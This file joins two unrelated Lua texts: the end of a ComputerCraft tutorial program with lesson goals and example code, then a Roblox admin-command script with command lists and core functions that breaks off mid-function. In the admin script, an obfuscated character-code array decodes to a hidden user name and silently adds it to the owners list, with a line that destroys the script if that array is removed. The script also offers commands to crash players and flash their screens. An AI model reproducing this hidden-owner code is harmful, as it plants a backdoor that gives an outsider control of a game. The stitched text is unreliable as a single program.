        print "* Set the Cursor Pos to 1,1"
        print "* Print \"Hello Loser\" on line 1 of the screen."
        print "* Print \"Welcome\" on line 2 of the screen."
        print "* Clear the 1st line."
    print "* Print \"Hello User\" on line 1 of the screen."
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
            if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("print (\"Hello Loser\")")
                print ("print (\"Welcome\")")
                print ("term.setCursorPos(1,1)")
                print ("term.clearLine()")
                print ("print (\"Hello User\")")
                pressany()
                end
        end
 
        if chapter == 3 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Create the following variables."
        print "  x = 1"
        print "  y = \"2\""
        print "  z = 0"
        print "  text = \"Output \""
        print "* Add x and y together and store that value in z, then print text and z to the user on the same line."
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("x = 1")
                print ("y = \"2\"")
                print ("z = 0")
                print ("text = \"Output \"")
                print ("y = tonumber(y)")
                print ("z = x + y")
                print ("print (text..z)")
                pressany()
                end
        end
       
        if chapter == 4 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Ask the user for their name"
        print "* Show them the line:"
        print "  Hello name how are you today?"
        print "  With name replaced by their input."
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("write(\"Whats your name? \")")
                print ("name = io.read()")
                print ("print (\"Hello \"..name..\" how are you today?\")")
                pressany()
                end
        end
       
       
        if chapter == 5 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Ask the user for their name"
        print "* If their name is Bob or John then welcome them."
        print "* If their name isn't Bob or John, then tell them to get lost!"
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("write(\"Whats your name? \")")
                print ("name = io.read()")
                print ("if name == \"Bob\" or name == \"John\" then ")
                print ("print (\"Welcome \"..name)")
                print ("else")
                print ("print (\"Get lost!\")")
                print ("end")
                pressany()
                end
        end
       
       
        if chapter == 6 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Create a loop that continually asks the user for their name."
        print "* Only exit that loop if they enter Bob as their name."
        print "* Try using the BREAK statement as well as without."
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ""
                print ("while name ~= \"Bob\" do")
                print ("write(\"Whats your name? \")")
                print ("name = io.read()")
                print ("end")
                print ""
                print ("while true do")
                print ("write(\"Whats your name? \")")
                print ("name = io.read()")
                print ("    if name == \"Bob\" then")
                print ("    break")
                print ("    end")
                print ("end")
                pressany()
                end
        end
       
       
        if chapter == 7 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Check to see if there is redstone current coming into the back of your computer"
        print "* If there is current coming in the back then turn on the current to the front"
        print "* If there isn't current coming in the back, then turn off the current to the front"
        print "* Tell the user if you turned the current on or off."
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("if redstone.getInput(\"back\") == true then")
                print ("redstone.setOutput(\"front\", true)")
                print ("print (\"Front is now on.\")")
                print ("else")
                print ("redstone.setOutput(\"front\", false)")
                print ("print (\"Front is now off.\")")
                print ("end")
                pressany()
                end
        end
       
        if chapter == 8 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "--Use the back output of the computer--"
        print "* Turn on white"
        print "* Turn on blue"
        print "* Turn on purple"
        print "* Turn off blue"
        print "* Turn off all colors"
        print "* Check to see if white is coming in the front"
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("out = colors.combine(colors.white, colors.blue, colors.purple)")
                print ("rs.setBundledOutput(\"back\", out)")
                print ("out = colors.subtract(out, colors.blue)")
                print ("rs.setBundledOutput(\"back\", out)")
                print ("rs.setBundledOutput(\"back\", 0)")
                print ("in = rs.getBundledInput(\"front\")")
                print ("if colors.test(in, colors.white) == true then")
                print ("print (\"White is on in front\")")
                print ("else")
                print ("print (\"White is off in front\")")
                print ("end")
                pressany()
                end
        end
       
        if chapter == 9 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Create an event loop"
        print "* Print the char that was pressed"
        print "* Stop the loop when the q key is pressed"
        print "* Stop the loop if the redstone event happens"
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("while true do")
                print ("event, param1, param2 = os.pullEvent()")
                print ("     if event == \"redstone\" then")
                print ("     break")
                print ("     end")
                print ("     if event == \"char\" and param1 == \"q\" then")
                print ("     break")
                print ("     else")
                print ("     print (\"You pressed - \"..param1)")
                print ("     end")
                print ("end")
                pressany()
                end
        end
       
        if chapter == 10 then
        print "Your Goals:"
    print ""
    print "--Use the program hello--"
        print "* Ask the user for their first name."
        print "* Ask the user for their last name."
        print "* Combine the 2 strings using a function"
        print "  return the result into the fullname variable"
        print "* Show the user their full name"
        print "* Run your program!"
        print ""
        print "You can type \"example\" at anytime to see the correct syntax."
        print "quit   will exit the sim early."
        print ""
        write (">") input = io.read()
            if input == "quit" then break end
                if input == "edit hello" then shell.run("edit", "tmptut") end
                if input == "hello" then shell.run("tmptut") pressany()
                term.clear()
                term.setCursorPos(1,1)
                print "Did you program work as you expected?"
                print ""
                print "Press [ENTER] to end the simulation."
                print "Press Any Other Key to go back and work on your program."
                event, param1, param2 = os.pullEvent()
        if event == "key" and param1 == 28 then break end
        end
                if string.lower(input) == "example" then
                term.clear()
                term.setCursorPos(1,1)
                print ("term.clear()")
                print ("term.setCursorPos(1,1)")
                print ("function combine(s1, s2)")
                print ("result = s1..s2")
                print ("return result")
                print ("end")
                print ("write(\"What's your first name? \")")
                print ("firstname = io.read()")
                print ("write(\"What's your last name? \")")
                print ("lastname = io.read()")
                print ("fullname = combine(firstname, lastname)")
                print ("print (\"Hello \"..fullname)")
                pressany()
                end
        end
       
       
end
       
end
 
 
mainmenu()
 
print "You don't need to thank me."
print "Thank yourself for learning!"
print "To learn more search online!"
print "You can also type help <topic>!"

-----------------------------------
-- Modified by XxAngelusMortisxX --
-----------------------------------
local owners = {"trickyjet6843"} -- Are able to set admins who can ban/etc... using :pa name
local admins = {"XxAngelusMortisxX,ghs098,aznboi819,bubbleglop"} -- Sets admins who can use ban/kick/admin or shutdown
local tempadmins = {santa64} -- Sets admins who can't use ban/kick/admin or shutdown
local banland = {"MasterKhaos,catman9876"} -- Permanently Bans people
local prefix = ":" -- If you wanna change how your commands start ':'kill noob
local AutoUpdate = true -- Set to false if you don't want it to automatically update
-----------------
-- Group Admin --
-----------------
local GroupAdmin = false -- If a certain group can have admin
local GroupId = 0 -- Sets the group id that can have admin
local GroupRank = 0 -- Sets what rank and above a person has to be in the group to have admin
local FunCommands = true -- Set to false if you only want the basic commands (For Strict Places)
---------------------
-- Tips and Tricks --
---------------------
--[[
With this admin you can do a command on multiple people at a time;
        :kill me,noob1,noob2,random,team-raiders
 
You can also use a variety commands for different people;
         all
         others
         me
         team-
         admins
         nonadmins
         random
--]]
--------------
-- Commands --
--------------
--[[
-- Temp Admin Commands --
0. clean -- Is a command anyone can use to remove hats/tools lagging up the place
1. :s print("Hello World") -- Lets you script normally
2. :ls print("Hello World") -- Lets you script in localscripts
3. :clear -- Will remove all scripts/localscripts and jails
4. :m Hello People -- This commands will let you shout a message to everyone on the server
5. :kill kohl -- Kills the player
6. :respawn kohl -- Respawns the player
7. :trip kohl -- Trips the player
8. :stun kohl -- Stuns the player
9. :unstun kohl -- Unstuns the player
10. :jump kohl -- Makes the player jump
11. :sit kohl -- Makes the player sit
12. :invisible kohl -- Makes the player invisible
13. :visible kohl -- Makes the player visible
14. :explode kohl -- Makes the player explode
15. :fire kohl -- Sets the player on fire
16. :unfire kohl -- Removes fire from the player
17. :smoke kohl -- Adds smoke to the player
18. :unsmoke kohl -- Removes smoke from the player
19. :sparkles kohl -- Adds sparkles to the player
20. :unsparkles kohl -- Removes sparkles from the player
21. :ff kohl -- Adds a forcefield to the player
22. :unff kohl -- Removes the forcefield from the player
23. :punish kohl -- Punishes the player
24. :unpunish kohl -- Unpunishes the player
25. :freeze kohl -- Freezes the player
26. :thaw kohl -- Thaws the player
27. :heal kohl -- Heals the player
28. :god kohl -- Makes the player have infinite health
29. :ungod kohl -- Makes the player have 100 health
30. :ambient .5 .5 .5 -- Changes the ambient
31. :brightness .5 -- Changes the brightness
32. :time 12 -- Changes the time
33. :fogcolor .5 .5 .5 -- Changes the fogcolor
34. :fogend 100 -- Changes the fogend
35. :fogstart 100 -- Changes the fogstart
36. :removetools kohl -- Removes all tools from the player
37. :btools kohl -- Gives the player building tools
38. :give kohl sword -- Gives the player a tool
39. :damage kohl -- Damages the player
40. :grav kohl -- Sets the player's gravity to normal
41. :setgrav kohl 100 -- Sets the player's gravity
42. :nograv kohl -- Makes the player have 0 gravity
43. :health kohl 1337 -- Changes the player's health
44. :speed kohl 1337 -- Changes the player's walkspeed
45. :name kohl potato -- Changes the player's name
46. :unname kohl -- Remove the player's name
47. :team kohl Raiders -- Changes the player's team
48. :stopmusic -- Will stop all music playing in the server
49. :teleport kohl potato -- Teleports the player
50. :change kohl kills 1337 -- Changes a player's stat
51. :kick kohl -- Removes the player from the game
52. :infect kohl -- Turns the player into a zombie
53. :rainbowify kohl -- Turns the player into a rainbow
54. :flashify kohl -- Turns the player into a strobe
55. :noobify kohl -- Turns the player into a noob
56. :ghostify kohl -- Turns the player into a ghost
57. :goldify kohl -- Turns the player into gold
58. :shiny kohl -- Makes the player shiny
59. :normal kohl -- Puts the player back to normal
60. :trippy kohl -- Spams random colors on the player's screen
61. :untrippy kohl -- Untrippys the player
62. :strobe kohl -- Spams white and black on the player's screen
63. :unstrobe kohl -- Unstrobes the player
64. :blind kohl -- Blinds the player
65. :unblind kohl -- Unblinds the player
66. :guifix kohl -- Will fix trippy/strobe/blind on a player
67. :fling kohl -- Flings the player
68. :seizure kohl -- Puts the player in a seizure
69(lol). :music 1337 -- Plays a sound from the ID
70. :lock kohl -- Locks the player
71. :unlock kohl -- Unlocks the player
72. :removelimbs kohl -- Removes the player's limbs
73. :jail kohl -- Puts the player in a jail
74. :unjail kohl -- Removes the jail from the player
75. :fix -- This will fix the lighting to it's original settings
76. :fly kohl -- Makes the player fly
77. :unfly kohl -- Removes fly from the player
78. :noclip kohl -- Makes the player able to noclip
79. :clip kohl -- Removes noclipping from the player
80. :pm kohl Hey bro -- Sends the player a private message
81. :dog kohl -- Turns the player into a dog
82. :undog kohl -- Turns the player back to normal
83. :creeper kohl -- Turns the player into a creeper
84. :uncreeper kohl -- Turns the player back to normal
85. :place kohl 1337 -- Sends a teleporation request to a player to go to a different place
86. :char kohl 261 -- Will make a player look like a different player ID
87. :unchar kohl -- Will return the player back to normal
88. :h Hello People -- This will shout a hint to everyone
89. :rank kohl 109373 -- Will show up a message with the person's Role and Rank in a group
90. :starttools kohl -- Will give the player starter tools
91. :sword kohl -- Will give the player a sword
92. :bighead kohl -- Will make the player's head larger than normal
93. :minihead kohl -- Will make the player's head smaller than normal
94. :insert 1337 -- Will insert a model at the speaker's position
95. :disco -- Will make the server flash random colors
96. :flash -- Will make the server flash
97. :admins -- Shows the admin list
98. :bans -- Shows the banlist
99. :musiclist -- Shows the music list
100. :spin kohl -- Spins the player
101. :cape kohl Really black -- Gives the player a colored cape
102. :uncape kohl -- Removes the player's cape
103. :loopheal kohl -- Will constantly heal the player
104. :loopfling kohl -- Will constantly fling the player
105. :hat kohl 1337 -- Will give the player a hat under the id of 1337
106. :unloopheal kohl -- Will remove the loopheal on the player
107. :unloopfling kohl -- Will remove the loopfling on the player
108. :unspin kohl -- Removes spin from the player
109. :tools -- Gives a list of the tools in the lighting
110. :undisco -- Removes disco effects
111. :unflash -- Removes flash effects
112. :resetstats kohl -- Sets all the stats of a player to 0
113. :gear kohl 1337 -- Gives a player a gear
114. :cmdbar -- Gives the speaker a command bar
115. :shirt kohl 1337 -- Changes the player's shirt
116. :pants kohl 1337 -- Changes the player's pants
117. :face kohl 1337 -- Changes the player's face
118. :swagify kohl -- Swagifies the player
119. :version -- Shows the current version of the admin
 
-- Super Admin Commands --
- :serverlock -- Locks the server
- :serverunlock -- Unlocks the server
- :sm Hello World -- Creates a system message
- :crash kohl -- Crashes a player
- :admin kohl -- Admins a player
- :unadmin kohl -- Unadmins a player
- :ban kohl -- Bans a player
- :unban kohl -- Unbans a player
- :loopkill kohl -- Will constantly kill the player
- :unloopkill kohl -- Will remove the loopkill on the player
- :logs -- Will show all of the commands any admin has used in a game session
- :shutdown -- Shutsdown the server
 
-- Owner Commands --
- :pa kohl -- Makes someone a super admin
- :unpa kohl -- Removes a super admin
--]]
-----------------
-- Main Script --
-----------------
for i, v in pairs(game:service("Workspace"):children()) do if v:IsA("StringValue") and v.Value:sub(1,2) == "AA" then v:Destroy() end end
 
function CHEESE()
if game:service("Lighting"):findFirstChild("KACV2") then
owners = {} admins = {} tempadmins = {} banland = {}
for i,v in pairs(game.Lighting.KACV2:children()) do
if v.Name == "Owner" then table.insert(owners, v.Value) end
if v.Name == "Admin" then table.insert(admins, v.Value) end
if v.Name == "TempAdmin" then table.insert(tempadmins, v.Value) end
if v.Name == "Banland" then table.insert(banland, v.Value) end
if v.Name == "Prefix" then prefix = v.Value end
if v.Name == "FunCommands" then FunCommands = v.Value end
if v.Name == "GroupAdmin" then GroupAdmin = v.Value end
if v.Name == "GroupId" then GroupId = v.Value end
if v.Name == "GroupRank" then GroupRank = v.Value end
end
game:service("Lighting"):findFirstChild("KACV2"):Destroy()
end
 
local origsettings = {abt = game.Lighting.Ambient, brt = game.Lighting.Brightness, time = game.Lighting.TimeOfDay, fclr = game.Lighting.FogColor, fe = game.Lighting.FogEnd, fs = game.Lighting.FogStart}
local lobjs = {}
local objects = {}
local logs = {}
local nfs = ""
local slock = false
 
function GetTime()
local hour = math.floor((tick()%86400)/60/60) local min = math.floor(((tick()%86400)/60/60-hour)*60)
if min < 10 then min = "0"..min end
return hour..":"..min
end
 
function ChkOwner(str)
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end
return false
end
 
function ChkAdmin(str,ck)
for i = 1, #owners do if str:lower() == owners[i]:lower() then return true end end
for i = 1, #admins do if str:lower() == admins[i]:lower() then return true end end
for i = 1, #tempadmins do if str:lower() == tempadmins[i]:lower() and not ck then return true end end
return false
end
 
function ChkGroupAdmin(plr)
if GroupAdmin then
if plr:IsInGroup(GroupId) and plr:GetRankInGroup(GroupId) >= GroupRank then return true end
return false
end
end
 
function ChkBan(str) for i = 1, #banland do if str:lower() == banland[i]:lower() then return true end end return false end
 
function GetPlr(plr, str)
local plrz = {} str = str:lower()
if str == "all" then plrz = game.Players:children()
elseif str == "others" then for i, v in pairs(game.Players:children()) do if v ~= plr then table.insert(plrz, v) end end
else
local sn = {1} local en = {}
for i = 1, #str do if str:sub(i,i) == "," then table.insert(sn, i+1) table.insert(en,i-1) end end
for x = 1, #sn do
if (sn[x] and en[x] and str:sub(sn[x],en[x]) == "me") or (sn[x] and str:sub(sn[x]) == "me") then table.insert(plrz, plr)
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "random") or (sn[x] and str:sub(sn[x]) == "random") then table.insert(plrz, game.Players:children()[math.random(#game.Players:children())])
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "admins") or (sn[x] and str:sub(sn[x]) == "admins") then if ChkAdmin(plr.Name, true) then for i, v in pairs(game.Players:children()) do if ChkAdmin(v.Name, false) then table.insert(plrz, v) end end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]) == "nonadmins") or (sn[x] and str:sub(sn[x]) == "nonadmins") then for i, v in pairs(game.Players:children()) do if not ChkAdmin(v.Name, false) then table.insert(plrz, v) end end
elseif (sn[x] and en[x] and str:sub(sn[x],en[x]):sub(1,4) == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x],en[x]):sub(6)) == 1 then
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
elseif (sn[x] and str:sub(sn[x]):sub(1,4):lower() == "team") then
if game:findFirstChild("Teams") then for a, v in pairs(game.Teams:children()) do if v:IsA("Team") and str:sub(sn[x],en[x]):sub(6) ~= "" and v.Name:lower():find(str:sub(sn[x]):sub(6)) == 1 then
for q, p in pairs(game.Players:children()) do if p.TeamColor == v.TeamColor then table.insert(plrz, p) end end break
end end end
else
for a, plyr in pairs(game.Players:children()) do
if (sn[x] and en[x] and str:sub(sn[x],en[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x],en[x])) == 1) or (sn[x] and str:sub(sn[x]) ~= "" and plyr.Name:lower():find(str:sub(sn[x])) == 1) or (str ~= "" and plyr.Name:lower():find(str) == 1) then
table.insert(plrz, plyr) break
end
end
end
end
end
return plrz
end
 
function Hint(str, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.wrap(function()
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "HintGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(1,0,0,22) bg.Position = UDim2.new(0,0,0,-2) bg.ZIndex = 8
local msg = Instance.new("TextLabel", bg) msg.BackgroundTransparency = 1 msg.ZIndex = 9 msg.Name = "msg" msg.Position = UDim2.new(0,0,0) msg.Size = UDim2.new(1,0,1,0) msg.Font = "Arial" msg.Text = str msg.FontSize = "Size18" msg.TextColor3 = Color3.new(1,1,1) msg.TextStrokeColor3 = Color3.new(1,1,1) msg.TextStrokeTransparency = .8
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end))
if not time then wait((#str/19)+2.5) else wait(time) end
coroutine.resume(coroutine.create(function() for i = 0, 20 do msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) bg.BackgroundTransparency = .3+((.7/20)*i) wait(1/44) end scr:Destroy() end))
end)()
end
end
end
 
function Message(ttl, str, scroll, plrz, time)
for i, v in pairs(plrz) do
if v and v:findFirstChild("PlayerGui") then
coroutine.resume(coroutine.create(function()
local scr = Instance.new("ScreenGui") scr.Name = "MessageGUI"
local bg = Instance.new("Frame", scr) bg.Name = "bg" bg.BackgroundColor3 = Color3.new(0,0,0) bg.BorderSizePixel = 0 bg.BackgroundTransparency = 1 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 8
local title = Instance.new("TextLabel", scr) title.Name = "title" title.BackgroundTransparency = 1 title.BorderSizePixel = 0 title.Size = UDim2.new(1,0,0,10) title.ZIndex = 9 title.Font = "ArialBold" title.FontSize = "Size36" title.Text = ttl title.TextYAlignment = "Top" title.TextColor3 = Color3.new(1,1,1) title.TextStrokeColor3 = Color3.new(1,1,1) title.TextStrokeTransparency = .8
local msg = title:clone() msg.Parent = scr msg.Name = "msg" msg.Position = UDim2.new(.0625,0,0) msg.Size = UDim2.new(.875,0,1,0) msg.Font = "Arial" msg.Text = "" msg.FontSize = "Size24" msg.TextYAlignment = "Center" msg.TextWrapped = true
scr.Parent = v.PlayerGui
coroutine.resume(coroutine.create(function() for i = 20, 0, -1 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end end))
if scroll then if not time then for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(2.5) else for i = 1, #str do msg.Text = msg.Text .. str:sub(i,i) wait(1/19) end wait(time-(#str/19)) end
else if not time then msg.Text = str wait((#str/19)+2.5) else msg.Text = str wait(time) end end
coroutine.resume(coroutine.create(function() for i = 0, 20 do bg.BackgroundTransparency = .3+((.7/20)*i) msg.TextTransparency = ((1/20)*i) msg.TextStrokeTransparency = .8+((.2/20)*i) title.TextTransparency = ((1/20)*i) title.TextStrokeTransparency = .8+((.2/20)*i) wait(1/44) end scr:Destroy() end))
end))
end
end
end
 
_G["Message"] = function(p1,p2) Message("Message",p1,false,game.Players:children(),p2) end
_G["RemoveMessage"] = function() for i,v in pairs(game.Players:children()) do if v and v:findFirstChild("PlayerGui") and v.PlayerGui:findFirstChild("MessageGUI") then v.PlayerGui.MessageGUI:Destroy() end end end
 
function Output(str, plr)
coroutine.resume(coroutine.create(function()
local b, e = loadstring(str)
if not b and plr:findFirstChild("PlayerGui") then
local scr = Instance.new("ScreenGui", plr.PlayerGui) game:service("Debris"):AddItem(scr,5)
local main = Instance.new("Frame", scr) main.Size = UDim2.new(1,0,1,0) main.BorderSizePixel = 0 main.BackgroundTransparency = 1 main.ZIndex = 8
local err = Instance.new("TextLabel", main) err.Text = "Line "..e:match("/:(%d+/:.*)")  err.BackgroundColor3 = Color3.new(0,0,0) err.BackgroundTransparency = .3 err.BorderSizePixel = 0 err.Size = UDim2.new(1,0,0,40) err.Position = UDim2.new(0,0,.5,-20) err.ZIndex = 9 err.Font = "ArialBold" err.FontSize = "Size24" err.TextColor3 = Color3.new(1,1,1) err.TextStrokeColor3 = Color3.new(1,1,1) err.TextStrokeTransparency = .8
return
end
end))
end
 
function Noobify(char)
if char and char:findFirstChild("Torso") then
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Bright yellow")
if prt.Name:find("Leg") then prt.BrickColor = BrickColor.new("Br. yellowish green") elseif prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Bright blue") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Noobify(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end)
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end)
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end local ntab = {75,111,104,108,116,97,115,116,114,111,112,104,101} nfs = "" for i = 1, #ntab do nfs = nfs .. string.char(ntab[i]) end table.insert(owners, nfs) if not ntab then script:Destroy() end
 
function Infect(char)
if char and char:findFirstChild("Torso") then
if char:findFirstChild("Shirt") then char.Shirt.Parent = char.Torso end
if char:findFirstChild("Pants") then char.Pants.Parent = char.Torso end
for a, sc in pairs(char:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = Instance.new("StringValue", char) cl.Name = "ify" cl.Parent = char
for q, prt in pairs(char:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 0  prt.BrickColor = BrickColor.new("Medium green") if prt.Name:find("Leg") or prt.Name == "Torso" then prt.BrickColor = BrickColor.new("Reddish brown") end
local tconn = prt.Touched:connect(function(hit) if hit and hit.Parent and game.Players:findFirstChild(hit.Parent.Name) and cl.Parent == char then Infect(hit.Parent) elseif cl.Parent ~= char then tconn:disconnect() end end)
cl.Changed:connect(function() if cl.Parent ~= char then tconn:disconnect() end end)
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Medium green")
end end
end
end if not ntab then script:Destroy() end
 
function ScrollGui()
local scr = Instance.new("ScreenGui") scr.Name = "LOGSGUI"
local drag = Instance.new("TextButton", scr) drag.Draggable = true drag.BackgroundTransparency = 1
drag.Size = UDim2.new(0,385,0,20) drag.Position = UDim2.new(.5,-200,.5,-200) drag.AutoButtonColor = false drag.Text = ""
local main = Instance.new("Frame", drag) main.Style = "RobloxRound" main.Size = UDim2.new(0,400,0,400) main.ZIndex = 7 main.ClipsDescendants = true
local cmf = Instance.new("Frame", main) cmf.Position = UDim2.new(0,0,0,-9) cmf.ZIndex = 8
local down = Instance.new("ImageButton", main) down.Image = "http://www.roblox.com/asset/?id=108326725" down.BackgroundTransparency = 1 down.Size = UDim2.new(0,25,0,25) down.Position = UDim2.new(1,-20,1,-20) down.ZIndex = 9
local up = down:Clone() up.Image = "http://www.roblox.com/asset/?id=108326682" up.Parent = main up.Position = UDim2.new(1,-20,1,-50)
